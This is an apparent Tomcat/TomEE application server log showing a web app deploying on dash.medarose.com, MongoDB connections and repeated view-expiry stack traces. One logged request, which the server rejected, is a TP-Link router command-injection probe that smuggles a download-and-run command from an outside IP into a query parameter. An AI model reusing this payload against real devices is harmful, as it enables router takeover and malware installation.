+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.OutboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpOutboundRewriteProducer<0>]
+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.ContextListener [org.ocpsoft.rewrite.prettyfaces.PrettyConfigContextListener<0>]
+14-Jul-2024 16:59:28.355 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.rewrite.servlet.spi.RequestListener []
+14-Jul-2024 16:59:28.356 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestParameterProvider [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRequestParameterProvider<0>]
+14-Jul-2024 16:59:28.357 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.el.spi.ExpressionLanguageProvider [org.ocpsoft.rewrite.faces.FacesExpressionLanguageProvider<30>]
+14-Jul-2024 16:59:28.359 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.InvocationResultHandler [org.ocpsoft.rewrite.faces.NavigatingInvocationResultHandler<100>]
+14-Jul-2024 16:59:28.359 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.common.spi.ServiceEnricher []
+14-Jul-2024 16:59:28.361 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.ConfigurationCacheProvider [org.ocpsoft.rewrite.servlet.impl.ServletContextConfigurationCacheProvider<0>]
+14-Jul-2024 16:59:28.364 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [2] org.ocpsoft.rewrite.config.ConfigurationProvider [org.ocpsoft.rewrite.annotation.config.AnnotationConfigProvider<100>, org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteConfigurationProvider<1>]
+14-Jul-2024 16:59:28.368 INFO [main] org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider.null Loaded [0] org.ocpsoft.rewrite.spi.RuleCacheProvider []
+14-Jul-2024 16:59:28.621 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Rewrite 3.4.2.Final initialized.
+14-Jul-2024 16:59:28.630 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old.war] has finished in [5,089] ms
+14-Jul-2024 16:59:28.631 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war.war]
+14-Jul-2024 16:59:28.631 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- dash.medarose.com -> /medarose_war
+14-Jul-2024 16:59:28.692 SEVERE [main] org.apache.openejb.config.DeploymentLoader.addFacesConfigs A faces configuration file should be context relative when specified in web.xml. Please fix the value of context parameter javax.faces.CONFIG_FILES for the file WEB-INF/faces-config.xml
+14-Jul-2024 16:59:29.563 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:30.700 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war" loaded.
+14-Jul-2024 16:59:30.701 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:30.707 INFO [main] org.apache.openejb.cdi.CdiBuilder.initSingleton Existing thread singleton service in SystemInstance(): org.apache.openejb.cdi.ThreadSingletonServiceImpl@2e11485
+14-Jul-2024 16:59:30.709 INFO [main] org.apache.openejb.cdi.ManagedSecurityService.<init> Some Principal APIs could not be loaded: org.eclipse.microprofile.jwt.JsonWebToken out of org.eclipse.microprofile.jwt.JsonWebToken not found
+14-Jul-2024 16:59:30.712 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container is starting...
+14-Jul-2024 16:59:30.712 INFO [main] org.apache.webbeans.plugins.PluginLoader.startUp Adding OpenWebBeansPlugin : [CdiPlugin]
+14-Jul-2024 16:59:30.877 INFO [main] org.apache.openejb.cdi.CdiScanner.handleBda Using annotated mode for file:/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war/WEB-INF/lib/cdi-api-2.0.jar looking all classes to find CDI beans, maybe think to add a beans.xml if not there or add the jar to exclusions.list
+14-Jul-2024 16:59:30.954 INFO [main] org.springframework.data.mongodb.repository.cdi.MongoRepositoryExtension.<init> Activating CDI extension for Spring Data MongoDB repositories.
+14-Jul-2024 16:59:31.293 INFO [main] org.apache.webbeans.config.BeansDeployer.validateInjectionPoints All injection points were validated successfully.
+14-Jul-2024 16:59:31.298 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container has started, it took 586 ms.
+14-Jul-2024 16:59:31.303 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war)
+14-Jul-2024 16:59:31.839 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:31.841 INFO [main] org.omnifaces.ApplicationInitializer.logOmniFacesVersion Using OmniFaces version 3.2
+14-Jul-2024 16:59:31.966 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+14-Jul-2024 16:59:32.283 SEVERE [main] com.ocpsoft.pretty.faces.config.spi.ContextSpecifiedConfigurationProvider.loadConfiguration Pretty Faces config resource [/META-INF/pretty-config.xml] not found.
+14-Jul-2024 16:59:32.356 INFO [main] com.sun.faces.config.ConfigureListener.contextInitialized Initializing Mojarra 2.3.4 ( 20180405-0442 7a05fbdf38c7d725ccac9237e44de6dbc77bee7d) for context '/medarose_war'
+14-Jul-2024 16:59:32.972 INFO [main] org.ocpsoft.rewrite.faces.RewritePhaseListener.null RewritePhaseListener starting up.
+14-Jul-2024 16:59:33.607 INFO [main] org.primefaces.webapp.PostConstructApplicationEventListener.processEvent Running on PrimeFaces 8.0
+14-Jul-2024 16:59:33.608 INFO [main] org.primefaces.extensions.application.PostConstructApplicationEventListener.processEvent Running on PrimeFaces Extensions 8.0.2
+14-Jul-2024 16:59:33.614 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null RewriteFilter starting up...
+14-Jul-2024 16:59:33.633 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [4] org.ocpsoft.rewrite.servlet.spi.RewriteLifecycleListener [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteLifecycleListener<-100>, org.ocpsoft.rewrite.faces.FacesRewriteLifecycleListener<0>, org.ocpsoft.rewrite.servlet.config.lifecycle.JoinRewriteLifecycleListener<2147483647>, org.ocpsoft.rewrite.servlet.impl.DefaultRewriteLifecycleListener<2147483647>]
+14-Jul-2024 16:59:33.633 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestCycleWrapper [org.ocpsoft.rewrite.servlet.impl.HttpRewriteRequestCycleWrapper<0>]
+14-Jul-2024 16:59:33.633 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.RewriteProvider [org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider<0>]
+14-Jul-2024 16:59:33.633 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RewriteResultHandler [org.ocpsoft.rewrite.servlet.impl.HttpRewriteResultHandler<0>]
+14-Jul-2024 16:59:33.633 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.InboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpInboundRewriteProducer<0>]
+14-Jul-2024 16:59:33.633 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.OutboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpOutboundRewriteProducer<0>]
+14-Jul-2024 16:59:33.633 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.ContextListener [org.ocpsoft.rewrite.prettyfaces.PrettyConfigContextListener<0>]
+14-Jul-2024 16:59:33.634 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.rewrite.servlet.spi.RequestListener []
+14-Jul-2024 16:59:33.634 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestParameterProvider [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRequestParameterProvider<0>]
+14-Jul-2024 16:59:33.636 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.el.spi.ExpressionLanguageProvider [org.ocpsoft.rewrite.faces.FacesExpressionLanguageProvider<30>]
+14-Jul-2024 16:59:33.637 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.InvocationResultHandler [org.ocpsoft.rewrite.faces.NavigatingInvocationResultHandler<100>]
+14-Jul-2024 16:59:33.637 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.common.spi.ServiceEnricher []
+14-Jul-2024 16:59:33.639 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.ConfigurationCacheProvider [org.ocpsoft.rewrite.servlet.impl.ServletContextConfigurationCacheProvider<0>]
+14-Jul-2024 16:59:33.642 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [2] org.ocpsoft.rewrite.config.ConfigurationProvider [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteConfigurationProvider<1>, org.ocpsoft.rewrite.annotation.config.AnnotationConfigProvider<100>]
+14-Jul-2024 16:59:33.645 INFO [main] org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider.null Loaded [0] org.ocpsoft.rewrite.spi.RuleCacheProvider []
+14-Jul-2024 16:59:33.901 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Rewrite 3.4.2.Final initialized.
+14-Jul-2024 16:59:33.910 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war.war] has finished in [5,279] ms
+14-Jul-2024 16:59:33.910 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager]
+14-Jul-2024 16:59:33.912 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- dash.medarose.com -> /host-manager
+14-Jul-2024 16:59:33.924 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager
+14-Jul-2024 16:59:33.927 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager" loaded.
+14-Jul-2024 16:59:33.928 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager
+14-Jul-2024 16:59:33.935 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.deployWebApps using context file /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager/META-INF/context.xml
+14-Jul-2024 16:59:33.935 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager)
+14-Jul-2024 16:59:33.953 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:33.973 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/host-manager] has finished in [62] ms
+14-Jul-2024 16:59:33.973 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager]
+14-Jul-2024 16:59:33.974 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- dash.medarose.com -> /manager
+14-Jul-2024 16:59:33.985 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager
+14-Jul-2024 16:59:33.988 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager" loaded.
+14-Jul-2024 16:59:33.988 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager
+14-Jul-2024 16:59:33.994 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.deployWebApps using context file /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager/META-INF/context.xml
+14-Jul-2024 16:59:33.995 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager)
+14-Jul-2024 16:59:34.014 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:34.033 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/manager] has finished in [60] ms
+14-Jul-2024 16:59:34.033 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs]
+14-Jul-2024 16:59:34.033 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- dash.medarose.com -> /docs
+14-Jul-2024 16:59:34.044 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs
+14-Jul-2024 16:59:34.048 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs" loaded.
+14-Jul-2024 16:59:34.048 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs
+14-Jul-2024 16:59:34.054 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs)
+14-Jul-2024 16:59:34.070 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:34.088 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deployment of web application directory [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/docs] has finished in [55] ms
+14-Jul-2024 16:59:34.096 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Starting ProtocolHandler ["http-nio-8080"]
+14-Jul-2024 16:59:34.104 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Server startup in [36,970] milliseconds
+14-Jul-2024 16:59:34.232 INFO [http-nio-8080-exec-1] org.ocpsoft.rewrite.param.DefaultParameterStore.null Loaded [1] org.ocpsoft.rewrite.spi.GlobalParameterProvider [org.ocpsoft.rewrite.instance.WildcardParameterProvider<0>]
+14-Jul-2024 17:07:36.305 INFO [http-nio-8080-exec-10] com.mongodb.diagnostics.logging.SLF4JLogger.info Cluster created with settings {hosts=[localhost:27017], mode=SINGLE, requiredClusterType=UNKNOWN, serverSelectionTimeout='30000 ms', maxWaitQueueSize=500}
+14-Jul-2024 17:07:36.446 INFO [cluster-ClusterId{value='6693d4a0c84c4f728b57e24e', description='null'}-localhost:27017] com.mongodb.diagnostics.logging.SLF4JLogger.info Opened connection [connectionId{localValue:1, serverValue:5373}] to localhost:27017
+14-Jul-2024 17:07:36.455 INFO [cluster-ClusterId{value='6693d4a0c84c4f728b57e24e', description='null'}-localhost:27017] com.mongodb.diagnostics.logging.SLF4JLogger.info Monitor thread successfully connected to server with description ServerDescription{address=localhost:27017, type=STANDALONE, state=CONNECTED, ok=true, version=ServerVersion{versionList=[4, 4, 17]}, minWireVersion=0, maxWireVersion=9, maxDocumentSize=16777216, logicalSessionTimeoutMinutes=30, roundTripTimeNanos=5655755}
+14-Jul-2024 17:07:37.112 INFO [http-nio-8080-exec-10] com.mongodb.diagnostics.logging.SLF4JLogger.info Opened connection [connectionId{localValue:2, serverValue:5374}] to localhost:27017
+14-Jul-2024 18:14:36.570 INFO [http-nio-8080-exec-7] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+	java.lang.IllegalArgumentException: Invalid character found in the request target [/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>+cd+%2Ftmp+wget+http%3A%2F%2F74.50.81.158%2Fr%3B+curl+-O+http%3A%2F%2F74.50.81.158%2Fr%3B+chmod+%2Bx+r%3B+.%2Fr%20tplink)]. The valid characters are defined in RFC 7230 and RFC 3986
+		at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:491)
+		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:260)
+		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+		at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+		at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+		at java.base/java.lang.Thread.run(Thread.java:834)
+14-Jul-2024 20:26:13.498 INFO [http-nio-8080-exec-10] com.mongodb.diagnostics.logging.SLF4JLogger.info Opened connection [connectionId{localValue:3, serverValue:5384}] to localhost:27017
+14-Jul-2024 20:28:47.631 SEVERE [http-nio-8080-exec-5] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:47.761 SEVERE [http-nio-8080-exec-4] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:47.961 SEVERE [http-nio-8080-exec-1] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
